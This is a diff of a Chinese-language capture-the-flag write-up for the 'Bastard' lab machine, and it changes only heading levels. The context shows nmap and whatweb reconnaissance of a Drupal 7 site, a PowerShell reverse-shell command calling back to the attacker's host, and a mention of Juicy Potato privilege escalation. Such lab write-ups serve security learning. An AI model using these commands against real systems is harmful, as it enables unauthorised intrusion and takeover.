@@ -10,9 +10,9 @@ tags:
 ---
 > 本文章以 kali 地址为 10.10.16.46 做演示
 
-# 初始侦察
+## 初始侦察
 
-## nmap 端口扫描
+### nmap 端口扫描
 
 ```
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -30,7 +30,7 @@ PORT      STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 15.57 seconds
 ```
 
-## nmap 详细信息扫描
+### nmap 详细信息扫描
 
 ```
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -69,7 +69,7 @@ Nmap done: 1 IP address (1 host up) scanned in 76.10 seconds
 开放了 80、135、49154，详细信息扫描表明靶机跑在 Windows 下的 IIS 7.5上，运行的是 Drupal 7 服务，通过 ping 返回值为 ttl=127 确定为 Windows 操作系统，同时 80 端口暴露出了 includes、LICENSE.txt、robots.txt 等目录。
 
 > Drupal 是一个开源的内容管理系统，由 PHP 编写，主要用于构建和管理复杂网站
-## nmap udp 扫描
+### nmap udp 扫描
 
 ```
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -104,7 +104,7 @@ Nmap done: 1 IP address (1 host up) scanned in 5.16 seconds
 ```
 
 没有明确开放的状态，攻击面基本为零，可以后续按需再深入扫描。
-## nmap 漏洞脚本扫描
+### nmap 漏洞脚本扫描
 
 ```
 ┌──(kali㉿kali)-[~/Work/Kali]
@@ -165,7 +165,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6080.55 seconds
 ```
 
 没有新的有价值的东西
-## whatweb 探测
+### whatweb 探测
 
 通过 whatweb 可以进一步查看到 Drupal 的信息，进一步交叉验证系统和应用的情况。
 
@@ -174,7 +174,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6080.55 seconds
 └─$ whatweb 10.129.6.171                                                
 http://10.129.6.171 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.129.6.171], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
 ```
-## web-80 端口渗透
+### web-80 端口渗透
 
 根据 nmap 的扫描结果添加 hosts 记录：
 
@@ -576,7 +576,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.46 -Port 443
 
 ![反弹shell](反弹shell.png)
 
-## 提权
+### 提权
 
 靶机的操作系统为小于 Windows Server 2019，且开启了 SeImpersonate。可以使用 juicy-potato 提权。
 
